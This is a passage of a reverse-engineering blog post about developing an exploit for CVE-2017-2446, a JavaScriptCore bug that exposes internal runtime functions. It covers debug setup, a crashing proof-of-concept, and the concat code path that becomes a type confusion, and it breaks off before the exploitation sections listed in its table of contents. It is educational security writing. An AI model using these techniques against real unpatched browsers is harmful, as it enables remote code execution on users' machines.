<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Axel '0vercl0k' Souchet">
    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-2 {
        font-size: 8pt;
      }
      .tag-4 {
        font-size: 6pt;
     }
    </style>
    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />

    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src='https://www.googletagmanager.com/gtag/js?id=G-MRPDMQ259W'></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MRPDMQ259W');
</script>
  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
          <div class="nav-collapse">
            <ul class="nav">
              <ul class="nav">
                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
              </ul>

                <li >
                    <a href="../../../../../category/debugging.html">
                      <i class="icon-folder-open icon-large"></i>debugging
                    </a>
                </li>
                <li class="active">
                    <a href="../../../../../category/exploitation.html">
                      <i class="icon-folder-open icon-large"></i>exploitation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/misc.html">
                      <i class="icon-folder-open icon-large"></i>misc
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/obfuscation.html">
                      <i class="icon-folder-open icon-large"></i>obfuscation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/reverse-engineering.html">
                      <i class="icon-folder-open icon-large"></i>reverse-engineering
                    </a>
                </li>

                <li><a href="../../../../../pages/about.html">About</a></li>
                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>

            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.">
                                        CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<span class="label">Date</span>
<abbr class="published" title="2018-07-14T18:49:00-07:00">
        <i class="icon-calendar"></i>Sat 14 July 2018
</abbr>
<span class="label">By</span>
<a href="../../../../../author/yrp.html"><i class="icon-user"></i>yrp</a>
<span class="label">Category</span>
<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>


<span class="label">Tags</span>
	<a href="../../../../../tag/javascriptcore.html"><i class="icon-tag"></i>JavascriptCore</a>
	<a href="../../../../../tag/jsc.html"><i class="icon-tag"></i>jsc</a>
	<a href="../../../../../tag/cve-2017-2446.html"><i class="icon-tag"></i>cve-2017-2446</a>
	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
</footer><!-- /.post-info -->                </div>
                <h1 id="introduction">Introduction</h1>
<p>This post will cover the development of an exploit for JavaScriptCore (JSC) from the perspective of someone with no background in browser exploitation.</p>
<p>Around the start of the year, I was pretty burnt out on CTF problems and was interested in writing an exploit for something more complicated and practical. I settled on writing a WebKit exploit for a few reasons:</p>
<ul>
<li>It is code that is broadly used in the real world</li>
<li>Browsers seemed like a cool target in an area I had little familiarity (both C++ and interpreter exploitation.)</li>
<li>WebKit is (supposedly) the softest of the major browser targets.</li>
<li>There were good existing resources on WebKit exploitation, namely <a href="http://phrack.org/papers/attacking_javascript_engines.html">saelo’s Phrack article</a>, as well as a variety of public console exploits.</li>
</ul>
<p>With this in mind, I got a recommendation for an interesting looking bug that has not previously been publicly exploited: <a href="https://twitter.com/natashenka">@natashenka</a>’s CVE-2017-2446 from the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1032">project zero bugtracker</a>. The bug report had a PoC which crashed in <code>memcpy()</code> with some partially controlled registers, which is always a promising start.</p>
<p>This post assumes you’ve read saelo’s Phrack article linked above, particularly the portions on NaN boxing and butterflies -- I can’t do a better job of explaining these concepts than the article. Additionally, you should be able to run a browser/JavaScript engine in a debugger -- we will target Linux for this post, but the concepts should translate to your preferred platform/debugger.</p>
<p>Finally, the goal of doing this initially and now writing it up was and is to learn as much as possible. There is clearly a lot more for me to learn in this area, so if you read something that is incorrect, inefficient, unstable, a bad idea, or just have some thoughts to share, I’d love to hear from you.</p>


<div class="toc"><span class="toctitle">Table of contents:</span><ul>
<li><a href="#introduction">Introduction</a><ul>
<li><a href="#target-setup-and-tooling">Target Setup and Tooling</a><ul>
<li><a href="#target-modifications">Target modifications</a></li>
<li><a href="#other-useful-jsc-features">Other useful jsc features</a></li>
<li><a href="#symbols">Symbols</a></li>
<li><a href="#dumping-object-layouts">Dumping Object Layouts</a></li>
</ul>
</li>
<li><a href="#bug">Bug</a></li>
<li><a href="#infoleak">Infoleak</a><ul>
<li><a href="#concat-in-more-detail">concat in more detail</a></li>
<li><a href="#jsobject-layouts">JSObject layouts</a></li>
<li><a href="#salvation-through-symbols">Salvation Through Symbols</a></li>
<li><a href="#diagrams">Diagrams</a></li>
<li><a href="#oob-memory-is-a-large-value">OOB memory is a large value</a></li>
<li><a href="#oob-memory-is-a-zero">OOB Memory is a zero</a></li>
<li><a href="#notes-on-fastmalloc">Notes on fastMalloc</a></li>
</ul>
</li>
<li><a href="#arbitrary-write">Arbitrary Write</a><ul>
<li><a href="#failure-nan-boxing">Failure: NaN boxing</a></li>
<li><a href="#failure-smashing-fastmalloc">Failure: Smashing fastMalloc</a></li>
</ul>
</li>
<li><a href="#control-flow">Control Flow</a><ul>
<li><a href="#intldatetimeformat-crash">Intl.DateTimeFormat Crash</a></li>
<li><a href="#exploit-planning">Exploit Planning</a></li>
<li><a href="#one_gadget">one_gadget</a></li>
<li><a href="#memory-layout-and-rop">Memory layout and ROP</a></li>
<li><a href="#reverse-gadgets">Reverse gadgets</a></li>
</ul>
</li>
<li><a href="#putting-it-all-together">Putting it all together</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
</li>
</ul>
</div>
<h2 id="target-setup-and-tooling">Target Setup and Tooling</h2>
<p>First, we need a vulnerable version of WebKit. <a href="https://github.com/WebKit/webkit/tree/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore"><code>e72e58665d57523f6792ad3479613935ecf9a5e0</code></a> is the hash of the last vulnerable version (the fix is in <a href="https://github.com/WebKit/webkit/commit/f7303f96833aa65a9eec5643dba39cede8d01144"><code>f7303f96833aa65a9eec5643dba39cede8d01144</code></a>) so we check out and build off this.</p>
<p>To stay in more familiar territory, I decided to only target the <code>jsc</code> binary, not WebKit browser as a whole. <code>jsc</code> is a thin command line wrapper around <code>libJavaScriptCore</code>, the library WebKit uses for its JavaScript engine. This means any exploit for <code>jsc</code>, with some modification, should also work in WebKit. I’m not sure if this was a good idea in retrospect -- it had the benefit of resulting in a stable heap as well as reducing the amount of code I had to read and understand, but had fewer codepaths and objects available for the exploit.</p>
<p>I decided to target WebKit on Linux instead of macOS mainly due to debugger familiarity (gdb + <a href="https://github.com/hugsy/gef">gef</a>). For code browsing, I ended up using <code>vim</code> and <code>rtags</code>, which was… okay. If you have suggestions for C++ code auditing, I’d like to hear them.</p>
<h3 id="target-modifications">Target modifications</h3>
<p>I found that I frequently wanted to breakpoint in my scripts to examine the interpreter state. After screwing around with this for a while I eventually just added a <code>dbg()</code> function to <code>jsc</code>. This would allow me to write code like:</p>
<div class="highlight"><pre><span></span><code><span class="nx">dbg</span><span class="p">();</span> <span class="c1">// examine the memory layout</span>
<span class="nx">foo</span><span class="p">();</span> <span class="c1">// do something</span>
<span class="nx">dbg</span><span class="p">();</span> <span class="c1">//see how things have changed</span>
</code></pre></div>


<p>The patch to add <code>dbg()</code> to <code>jsc</code> is pretty straightforward.</p>
<div class="highlight"><pre><span></span><code><span class="gh">diff --git diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp</span>
<span class="gh">index bda9a09d0d2..d359518b9b6 100644</span>
<span class="gd">--- a/Source/JavaScriptCore/jsc.cpp</span>
<span class="gi">+++ b/Source/JavaScriptCore/jsc.cpp</span>
<span class="gu">@@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);</span>
 static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);
<span class="gi">+static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);</span>
 static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);
<span class="gu">@@ -1218,6 +1219,7 @@ protected:</span>

         addFunction(vm, &quot;debug&quot;, functionDebug, 1);
         addFunction(vm, &quot;describe&quot;, functionDescribe, 1);
<span class="gi">+        addFunction(vm, &quot;dbg&quot;, functionDbg, 0);</span>
         addFunction(vm, &quot;describeArray&quot;, functionDescribeArray, 1);
         addFunction(vm, &quot;print&quot;, functionPrintStdOut, 1);
         addFunction(vm, &quot;printErr&quot;, functionPrintStdErr, 1);
<span class="gu">@@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)</span>
     return JSValue::encode(jsUndefined());
 }

<span class="gi">+EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)</span>
<span class="gi">+{</span>
<span class="gi">+       asm(&quot;int3;&quot;);</span>
<span class="gi">+</span>
<span class="gi">+       return JSValue::encode(jsUndefined());</span>
<span class="gi">+}</span>
<span class="gi">+</span>
 EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)
 {
     if (exec-&gt;argumentCount() &lt; 1)
</code></pre></div>


<h3 id="other-useful-jsc-features">Other useful <code>jsc</code> features</h3>
<p>Two helpful functions added to the interpreter by <code>jsc</code> are <code>describe()</code> and <code>describeArray()</code>. As these functions would not be present in an actual target interpreter, they are not fair game for use in an exploit, however are very useful when debugging:</p>
<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; a = [0x41, 0x42];
65,66
&gt;&gt;&gt; describe(a);
Object: 0x7fc5663b01f0 with butterfly 0x7fc5663caec8 (0x7fc5663eac20:[Array, {}, ArrayWithInt32, Proto:0x7fc5663e4140, Leaf]), ID: 88
&gt;&gt;&gt; describeArray(a);
&lt;Butterfly: 0x7fc5663caec8; public length: 2; vector length: 3&gt;
</code></pre></div>


<h3 id="symbols">Symbols</h3>
<p>Release builds of WebKit don’t have asserts enabled, but they also don’t have symbols. Since we want symbols, we will build with <code>CFLAGS=-g CXXFLAGS=-g Scripts/Tools/build-webkit --jsc-only</code></p>
<p>The symbol information can take quite some time to parse by the debugger. We can reduce the load time of the debugger significantly by running <code>gdb-add-index</code> on both <code>jsc</code> and <code>libJavaScriptCore.so</code>.</p>
<h3 id="dumping-object-layouts">Dumping Object Layouts</h3>
<p>WebKit ships with a script for macOS to dump the object layout of various classes, for example, here is <code>JSC::JSString</code>:</p>
<div class="highlight"><pre><span></span><code>x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSString
Found 1 types matching &quot;JSString&quot; in &quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&quot;
  +0 { 24} JSString
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 &lt;  4&gt;         JSC::StructureID m_structureID;
  +4 &lt;  1&gt;         JSC::IndexingType m_indexingTypeAndMisc;
  +5 &lt;  1&gt;         JSC::JSType m_type;
  +6 &lt;  1&gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 &lt;  1&gt;         JSC::CellState m_cellState;
  +8 &lt;  4&gt;     unsigned int m_flags;
 +12 &lt;  4&gt;     unsigned int m_length;
 +16 &lt;  8&gt;     WTF::String m_value;
 +16 &lt;  8&gt;         WTF::RefPtr&lt;WTF::StringImpl&gt; m_impl;
 +16 &lt;  8&gt;             WTF::StringImpl * m_ptr;
Total byte size: 24
Total pad bytes: 0
</code></pre></div>


<p>This script required minor modifications to run on linux, but it was quite useful later on.</p>
<h2 id="bug">Bug</h2>
<p>With our target built and tooling set up, let’s dig into the bug a bit. JavaScript (apparently) has a feature to get the caller of a function:</p>
<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">q</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">q</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">g</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">f</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">g</span><span class="p">();</span> <span class="c1">// ‘q’ is now equal to ‘g’</span>
</code></pre></div>


<p>This behavior is disabled under certain conditions, notably if the JavaScript code is running in strict mode. The specific bug here is that if you called from a strict function to a non-strict function, JSC would allow you to get a reference to the strict function. From the PoC provided you can see how this is a problem:</p>
<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">q</span><span class="p">;</span>
<span class="c1">// this is a non-strict chunk of code, so getting the caller is allowed</span>
<span class="kd">function</span> <span class="nx">g</span><span class="p">(){</span>
    <span class="nx">q</span> <span class="o">=</span> <span class="nx">g</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">7</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">];</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
<span class="c1">// when anything, including the runtime, accesses a[3], g will be called</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="p">{</span><span class="nx">get</span> <span class="o">:</span> <span class="nx">g</span><span class="p">});</span>
<span class="c1">// trigger the runtime access of a[3]</span>
<span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
<span class="c1">// q now is a reference to an internal runtime function</span>
<span class="nx">q</span><span class="p">(</span><span class="mh">0x77777777</span><span class="p">,</span> <span class="mh">0x77777777</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// crash</span>
</code></pre></div>


<p>In this case, the <code>concat</code> code is in <a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"><code>Source/JavaScriptCore/builtins/ArrayPrototype.js</code></a> and is marked as ‘use strict’.</p>
<p>This behavior is not always exploitable: we need a JS runtime function ‘a’ which performs sanitization on arguments, then calls another runtime function ‘b’ which can be coerced into executing user supplied JavaScript to get a function reference to ‘b’. This will allow you to do <code>b(0x41, 0x42)</code>, skipping the sanitization on your inputs which ‘a’ would normally perform.</p>
<p>The JSC runtime is a combination of JavaScript and C++ which kind of looks like this:</p>
<div class="highlight"><pre><span></span><code>+-------------+
| User Code   | &lt;- user-provided code
+-------------+
| JS Runtime  | &lt;- JS that ships with the browser as part of the runtime
+-------------+
| Cpp Runtime | &lt;- C++ that implements the rest of the runtime
+-------------+
</code></pre></div>


<p>The <code>Array.concat</code> above is a good example of this pattern: when <code>concat()</code> is called it first goes into <code>ArrayPrototype.js</code> to perform sanitization on the argument, then calls into one of the concat implementations. The fastpath implementations are generally written in C++, while the slowpaths are either pure JS, or a different C++ implementation.</p>
<p>What makes this bug useful is the reference to the function we get (‘q’ in the above snippet) is <em>after</em> the input sanitization performed by the JavaScript layer, meaning we have a direct reference to the native function.</p>
<p>The provided PoC is an especially powerful example of this, however there are others -- some useful, some worthless. In terms of a general plan, we’ll need to use this bug to create an infoleak to defeat ASLR, then figure out a way to use it to hijack control flow and get a shell out of it.</p>
<h2 id="infoleak">Infoleak</h2>
<p>Defeating ASLR is the first order of business. To do this, we need to understand the reference we have in the <code>concat</code> code.</p>
<h3 id="concat-in-more-detail"><code>concat</code> in more detail</h3>
<p>Tracing the codepath from our <code>concat</code> call, we start in <a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/builtins/ArrayPrototype.js#L713"><code>Source/JavaScriptCore/builtins/ArrayPrototype.js</code></a>:</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">concat</span><span class="p">(</span><span class="nx">first</span><span class="p">)</span>
<span class="p">{</span>
    <span class="s2">&quot;use strict&quot;</span><span class="p">;</span>

    <span class="c1">// [1] perform some input validation</span>
    <span class="k">if</span> <span class="p">(</span><span class="err">@</span><span class="nx">argumentCount</span><span class="p">()</span> <span class="o">===</span> <span class="mi">1</span>
        <span class="o">&amp;&amp;</span> <span class="err">@</span><span class="nx">isJSArray</span><span class="p">(</span><span class="k">this</span><span class="p">)</span>
        <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="err">@</span><span class="nx">isConcatSpreadableSymbol</span> <span class="o">===</span> <span class="err">@</span><span class="kc">undefined</span>
        <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="err">@</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">first</span><span class="p">)</span> <span class="o">||</span> <span class="nx">first</span><span class="p">.</span><span class="err">@</span><span class="nx">isConcatSpreadableSymbol</span> <span class="o">===</span> <span class="err">@</span><span class="kc">undefined</span><span class="p">))</span> <span class="p">{</span>

        <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="err">@</span><span class="nx">concatMemcpy</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">first</span><span class="p">);</span> <span class="c1">// [2] call the fastpath</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">result</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// … snip ...</span>
</code></pre></div>


<p>In this code snippet the <code>@</code> is the interpreter glue which tells the JavaScript engine to look in the C++ bindings for the specified symbol. These functions are only callable via the JavaScript runtime which ships with Webkit, not user code. If you follow this through some indirection, you will find <code>@concatMemcpy</code> corresponds to <code>arrayProtoPrivateFuncAppendMemcpy</code> in  <a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L1309"><code>Source/JavaScriptCore/runtime/ArrayPrototype.cpp</code></a>:</p>
<div class="highlight"><pre><span></span><code><span class="n">EncodedJSValue</span> <span class="n">JSC_HOST_CALL</span> <span class="nf">arrayProtoPrivateFuncAppendMemcpy</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span> <span class="n">exec</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ASSERT</span><span class="p">(</span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">argumentCount</span><span class="p">()</span> <span class="o">==</span> <span class="mi">3</span><span class="p">);</span>

    <span class="n">VM</span><span class="o">&amp;</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">();</span>
    <span class="n">JSArray</span><span class="o">*</span> <span class="n">resultArray</span> <span class="o">=</span> <span class="n">jsCast</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">uncheckedArgument</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
    <span class="n">JSArray</span><span class="o">*</span> <span class="n">otherArray</span> <span class="o">=</span> <span class="n">jsCast</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">uncheckedArgument</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
    <span class="n">JSValue</span> <span class="n">startValue</span> <span class="o">=</span> <span class="n">exec</span><span class="o">-&gt;</span><span class="n">uncheckedArgument</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="n">ASSERT</span><span class="p">(</span><span class="n">startValue</span><span class="p">.</span><span class="n">isAnyInt</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">startValue</span><span class="p">.</span><span class="n">asAnyInt</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">startValue</span><span class="p">.</span><span class="n">asAnyInt</span><span class="p">()</span> <span class="o">&lt;=</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">unsigned</span><span class="o">&gt;::</span><span class="n">max</span><span class="p">());</span>
    <span class="kt">unsigned</span> <span class="n">startIndex</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span><span class="o">&gt;</span><span class="p">(</span><span class="n">startValue</span><span class="p">.</span><span class="n">asAnyInt</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">resultArray</span><span class="o">-&gt;</span><span class="n">appendMemcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">vm</span><span class="p">,</span> <span class="n">startIndex</span><span class="p">,</span> <span class="n">otherArray</span><span class="p">))</span> <span class="c1">// [3] fastpath...</span>
    <span class="c1">// … snip ...</span>
<span class="p">}</span>
</code></pre></div>


<p>Which finally calls into <code>appendMemcpy</code> in <a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/JSArray.cpp#L474"><code>JSArray.cpp</code></a>:</p>
<div class="highlight"><pre><span></span><code><span class="kt">bool</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">appendMemcpy</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span> <span class="n">exec</span><span class="p">,</span> <span class="n">VM</span><span class="o">&amp;</span> <span class="n">vm</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">startIndex</span><span class="p">,</span> <span class="n">JSC</span><span class="o">::</span><span class="n">JSArray</span><span class="o">*</span> <span class="n">otherArray</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// … snip ...</span>

    <span class="kt">unsigned</span> <span class="n">otherLength</span> <span class="o">=</span> <span class="n">otherArray</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">();</span>
    <span class="kt">unsigned</span> <span class="n">newLength</span> <span class="o">=</span> <span class="n">startIndex</span> <span class="o">+</span> <span class="n">otherLength</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">newLength</span> <span class="o">&gt;=</span> <span class="n">MIN_SPARSE_ARRAY_INDEX</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ensureLength</span><span class="p">(</span><span class="n">vm</span><span class="p">,</span> <span class="n">newLength</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [4] check dst size</span>
        <span class="n">throwOutOfMemoryError</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">scope</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ASSERT</span><span class="p">(</span><span class="n">copyType</span> <span class="o">==</span> <span class="n">indexingType</span><span class="p">());</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">ArrayWithDouble</span><span class="p">)</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">contiguousDouble</span><span class="p">().</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="n">startIndex</span><span class="p">,</span> <span class="n">otherArray</span><span class="o">-&gt;</span><span class="n">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">contiguousDouble</span><span class="p">().</span><span class="n">data</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">JSValue</span><span class="p">)</span> <span class="o">*</span> <span class="n">otherLength</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="nf">memcpy</span><span class="p">(</span><span class="n">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">contiguous</span><span class="p">().</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="n">startIndex</span><span class="p">,</span> <span class="n">otherArray</span><span class="o">-&gt;</span><span class="n">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">contiguous</span><span class="p">().</span><span class="n">data</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">JSValue</span><span class="p">)</span> <span class="o">*</span> <span class="n">otherLength</span><span class="p">);</span> <span class="c1">// [5] do the concat</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<p>This may seem like a lot of code, but given <code>Array</code>s <code>src</code> and <code>dst</code>, it boils down to this: </p>
<div class="highlight"><pre><span></span><code><span class="c1"># JS Array.concat</span>
<span class="k">def</span> <span class="nf">concat</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">typeof</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">==</span> <span class="n">Array</span> <span class="ow">and</span> <span class="n">typeof</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="n">Array</span><span class="p">:</span> <span class="n">concatFastPath</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span> <span class="n">concatSlowPath</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>

<span class="c1"># C++ concatMemcpy / arrayProtoPrivateFuncAppendMemcpy</span>
<span class="k">def</span> <span class="nf">concatFastPath</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span>
    <span class="n">appendMemcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>

<span class="c1"># C++ appendMemcpy</span>
<span class="k">def</span> <span class="nf">appendMemcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">allocated_size</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">dst</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dst</span><span class="p">),</span> <span class="n">src</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">src</span><span class="p">));</span>
</code></pre></div>


<p>However, thanks to our bug we can skip the type validation at <code>[1]</code> and call <code>arrayProtoPrivateFuncAppendMemcpy</code> directly with non-<code>Array</code> arguments! This turns the logic bug into a type confusion and opens up some exploitation possibilities.</p>
<h3 id="jsobject-layouts">JSObject layouts</h3>
<p>To understand the bug a bit better, let’s look at the layout of <code>JSArray</code>:</p>
<div class="highlight"><pre><span></span><code>x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSArray
Found 1 types matching &quot;JSArray&quot; in &quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&quot;
  +0 { 16} JSArray
  +0 { 16}     JSC::JSNonFinalObject
  +0 { 16}         JSC::JSObject
  +0 {  8}             JSC::JSCell
  +0 {  1}                 JSC::HeapCell
  +0 &lt;  4&gt;                 JSC::StructureID m_structureID;
  +4 &lt;  1&gt;                 JSC::IndexingType m_indexingTypeAndMisc;
  +5 &lt;  1&gt;                 JSC::JSType m_type;
